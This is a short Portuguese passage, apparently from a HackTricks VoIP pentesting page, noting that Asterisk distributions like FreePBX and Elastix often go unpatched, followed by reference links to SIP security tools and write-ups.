A maneira mais fácil de instalar um software como o Asterisk é baixar uma **distribuição de SO** que já o tenha instalado, como: **FreePBX, Elastix, Trixbox**... O problema com esses é que, uma vez que está funcionando, os administradores de sistema podem **não atualizá-los novamente** e **vulnerabilidades** serão descobertas com o tempo.

## Referências

- [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
- [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
- [http://blog.pepelux.org/](http://blog.pepelux.org/)
- [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
- [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
- [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

{{#include ../../banners/hacktricks-training.md}}
